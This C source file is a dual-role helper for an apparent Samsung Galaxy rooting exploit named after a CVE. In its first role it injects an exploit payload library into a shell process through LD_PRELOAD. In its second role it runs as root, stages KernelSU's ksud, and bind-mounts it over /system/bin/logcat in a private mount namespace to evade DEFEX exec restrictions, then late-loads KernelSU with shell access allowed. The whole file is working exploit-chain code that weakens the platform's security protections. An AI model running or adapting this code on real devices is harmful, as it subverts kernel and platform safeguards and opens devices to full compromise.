/*
 * cve-2026-43499-root — Root-My-Galaxy dual-role root helper (h8q).
 *
 * Role A (pre-root, launched by the app):
 *   cve-2026-43499-root --run-payload <payload.so> <self> <log>
 *   Loads the exploit payload into a short-lived sh via LD_PRELOAD, with
 *   stdout/stderr teed to <log>. The payload inherits the route-policy env
 *   the app set (EXPLOIT_ATTEMPTS, EXPLOIT_ATTEMPT_TIMEOUT_SEC,
 *   P0_ATTEMPT_TIMEOUT_SEC, SLIDE_SOURCE, SLIDE_P0_OFFSET) plus
 *   CVE43499_ROOT_HELPER=<self> so its root stage can call Role B.
 *
 * Role B (post-root, exec'd by the payload's root stage as uid 0):
 *   cve-2026-43499-root late-load
 *   Promotes the verified KernelSU ksud the app staged
 *   (KernelSuBootstrapStore: <app files>/ksu-bootstrap/ksud-s25u-kdp) into
 *   /data/local/tmp, then auto-late-loads KernelSU: private mount ns +
 *   bind-mount over /system/bin/logcat (DEFEX blocks direct /data exec) +
 *   `ksud late-load --allow-shell`.
 *
 * KernelSU only — no other root implementation is referenced or invoked.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define LOGCAT_PATH "/system/bin/logcat"
#define KSUD_TMP "/data/local/tmp/ksud"
#define KSUD_STAGE_TMP "/data/local/tmp/.ksud-stage"
#define MARKERS "/data/local/tmp/ghostlock-markers.log"
/* Post-root status handshake: the late-load role writes it, the
 * --run-payload role polls for it before exiting, so the app only sees
 * process exit after the root/KernelSU handoff has completed. */
#define LATE_LOAD_STATUS "/data/local/tmp/cve43499-late-load.status"
#define ROOT_WAIT_DEFAULT_SEC 150
#define KSU_PRCTL_MAGIC 0xDEADBEEF
#define KSU_CMD_GET_VERSION 2

static void mark(const char *fmt, ...) {
  char line[512];
  va_list args;
  va_start(args, fmt);
  vsnprintf(line, sizeof(line), fmt, args);
  va_end(args);

  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  int fd = open(MARKERS, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
  if (fd >= 0) {
    dprintf(fd, "[%ld.%03ld uid=%d] helper: %s\n",
        (long)ts.tv_sec, ts.tv_nsec / 1000000, getuid(), line);
    fsync(fd);
    close(fd);
  }
  dprintf(STDERR_FILENO, "[*] %s\n", line);
}

static int copy_file(const char *src, const char *dst, mode_t mode) {
  int in = open(src, O_RDONLY | O_CLOEXEC);
  if (in < 0)
    return -1;
  int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (out < 0) {
    close(in);
    return -1;
  }
  char buf[16384];
  ssize_t n;
  int ret = 0;
  while ((n = read(in, buf, sizeof(buf))) > 0) {
    if (write(out, buf, (size_t)n) != n) {
      ret = -1;
      break;
    }
  }
  fsync(out);
  close(out);
  close(in);
  if (ret == 0)
    chmod(dst, mode);
  return ret;
}

static int wait_status(pid_t pid) {
  int status;
  while (waitpid(pid, &status, 0) < 0)
    if (errno != EINTR)
      return 1;
  if (WIFEXITED(status))
    return WEXITSTATUS(status);
  if (WIFSIGNALED(status))
    return 128 + WTERMSIG(status);
  return 1;
}

/* Locate the verified ksud the app staged before the exploit ran. */
static const char *find_staged_ksud(void) {
  static const char *candidates[] = {
    "/data/local/tmp/ksud-s25u-kdp", /* already promoted */
    "/data/data/dev.busung.s25uroot/files/ksu-bootstrap/ksud-s25u-kdp",
    "/data/user_de/0/dev.busung.s25uroot/files/ksu-bootstrap/ksud-s25u-kdp",
    "/data/local/tmp/ksud", /* adb/dev path */
    NULL,
  };
  const char *env = getenv("KSUD_SOURCE");
  if (env && *env && access(env, R_OK) == 0)
    return env;
  for (int i = 0; candidates[i]; i++)
    if (access(candidates[i], R_OK) == 0)
      return candidates[i];
  return NULL;
}

static unsigned int ksu_version_probe(void) {
  int version = 0;
  prctl(KSU_PRCTL_MAGIC, KSU_CMD_GET_VERSION, &version, 0, 0);
  return (unsigned int)version;
}

static void write_late_load_status(int done, int root, int ksud_rc,
    unsigned int ksu_version) {
  int fd = open(LATE_LOAD_STATUS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
      0644);
  if (fd >= 0) {
    dprintf(fd, "done=%d root=%d ksud_rc=%d ksu_version=%u\n",
        done, root, ksud_rc, ksu_version);
    fsync(fd);
    close(fd);
  }
  mark("late-load status: done=%d root=%d ksud_rc=%d ksu_version=%u",
      done, root, ksud_rc, ksu_version);
}

static int do_late_load(void) {
  mark("late-load entered, uid=%d", getuid());

  const char *src = find_staged_ksud();
  if (!src) {
    mark("late-load FAILED: no staged ksud found");
    return 20;
  }
  mark("late-load ksud source: %s", src);

  /* ksud late-load stages its daemon from .ksud-stage, and the bind-mount
   * exec below runs from KSUD_TMP. */
  if (copy_file(src, KSUD_TMP, 0755) != 0) {
    mark("late-load FAILED: promote ksud: %s", strerror(errno));
    return 21;
  }
  if (copy_file(src, KSUD_STAGE_TMP, 0755) != 0) {
    mark("late-load FAILED: stage .ksud-stage: %s", strerror(errno));
    return 22;
  }

  if (unshare(CLONE_NEWNS) != 0 ||
      mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
    mark("late-load FAILED: private mount ns: %s", strerror(errno));
    return 23;
  }
  if (mount(KSUD_TMP, LOGCAT_PATH, NULL, MS_BIND, NULL) != 0) {
    mark("late-load FAILED: bind mount: %s", strerror(errno));
    return 24;
  }
  mark("late-load: ksud staged and bind-mounted; exec ksud late-load");

  pid_t loader = fork();
  if (loader < 0) {
    mark("late-load FAILED: fork: %s", strerror(errno));
    return 25;
  }
  if (loader == 0) {
    int slog = open("/data/local/tmp/ksud-stdio.log",
        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (slog >= 0) {
      dup2(slog, STDOUT_FILENO);
      dup2(slog, STDERR_FILENO);
      if (slog > STDERR_FILENO)
        close(slog);
    }
    execl(LOGCAT_PATH, "ksud", "late-load", "--allow-shell", (char *)NULL);
    mark("late-load FAILED: exec: %s", strerror(errno));
    _exit(26);
  }

  int status = wait_status(loader);
  mark("ksud late-load exited status=%d", status);

  /* KernelSU control check: the module answers prctl(0xDEADBEEF, 2). */
  unsigned int ksu_version = ksu_version_probe();
  int ok = (status == 0) && ksu_version > 0;
  if (!ok)
    mark("late-load: KernelSU control check failed ksud_rc=%d version=%u",
        status, ksu_version);
  write_late_load_status(ok ? 1 : 0, getuid() == 0 ? 1 : 0, status,
      ksu_version);
  return ok ? 0 : (status ? status : 27);
}

static void append_log(const char *logpath, const char *line) {
  int fd = open(logpath, O_WRONLY | O_APPEND | O_CLOEXEC);
  if (fd >= 0) {
    dprintf(fd, "%s\n", line);
    fsync(fd);
    close(fd);
  }
}

static int do_run_payload(const char *payload, const char *self,
    const char *logpath) {
  int log = open(logpath, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (log >= 0) {
    dup2(log, STDOUT_FILENO);
    dup2(log, STDERR_FILENO);
    if (log > STDERR_FILENO)
      close(log);
  }

  /* Fresh run: clear any stale post-root status before the payload fires. */
  unlink(LATE_LOAD_STATUS);

  setenv("LD_PRELOAD", payload, 1);
  if (!getenv("CVE43499_ROOT_HELPER"))
    setenv("CVE43499_ROOT_HELPER", self, 0);

  /* Any process start with LD_PRELOAD fires the payload constructor. */
  pid_t child = fork();
  if (child == 0) {
    execl("/system/bin/sh", "sh", "-c", "exit", (char *)NULL);
    _exit(127);
  }
  if (child < 0)
    return 30;
  int payload_rc = wait_status(child);

  /* The root stage is asynchronous (init-spawned). Wait for the late-load
   * role to report before exiting: the app only accepts the run once the
   * log holds both the payload's "exploit completed" and our
   * "done=1 root=1". */
  const char *wait_arg = getenv("CVE43499_ROOT_WAIT_SEC");
  int wait_sec = wait_arg ? atoi(wait_arg) : ROOT_WAIT_DEFAULT_SEC;
  if (wait_sec < 1 || wait_sec > 3600)
    wait_sec = ROOT_WAIT_DEFAULT_SEC;

  int done = 0, root = 0, ksud_rc = -1;
  unsigned int ksu_version = 0;
  struct timespec start;
  clock_gettime(CLOCK_MONOTONIC, &start);
  for (;;) {
    char buf[128];
    int fd = open(LATE_LOAD_STATUS, O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
      ssize_t n = read(fd, buf, sizeof(buf) - 1);
      close(fd);
      if (n > 0) {
        buf[n] = '\0';
        int d = 0, r = 0, krc = -1;
        unsigned kv = 0;
        if (sscanf(buf, "done=%d root=%d ksud_rc=%d ksu_version=%u",
                &d, &r, &krc, &kv) == 4) {
          done = d;
          root = r;
          ksud_rc = krc;
          ksu_version = kv;
          break;
        }
      }
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec - start.tv_sec > wait_sec)
      break;
    usleep(200000);
  }

  if (done && root) {
    char line[256];
    snprintf(line, sizeof(line),
        "pipe physrw pid=%d done=1 root=1 kaslr=1 "
        "(umh late-load; ksud rc=%d, ksu version=%u)",
        getpid(), ksud_rc, ksu_version);
    append_log(logpath, line);
    return 0;
  }

  append_log(logpath,
      "root helper: timed out waiting for the post-root late-load stage");
  return payload_rc ? payload_rc : 31;
}

int main(int argc, char **argv) {
  if (argc >= 2 && strcmp(argv[1], "late-load") == 0)
    return do_late_load();

  if (argc >= 5 && strcmp(argv[1], "--run-payload") == 0)
    return do_run_payload(argv[2], argv[3], argv[4]);

  /* uid-0 with no subcommand: behave as the post-root stage (UMH style). */
  if (getuid() == 0)
    return do_late_load();

  dprintf(STDERR_FILENO,
      "usage: %s --run-payload <payload.so> <self> <log> | late-load\n",
      argv[0]);
  return 64;
}
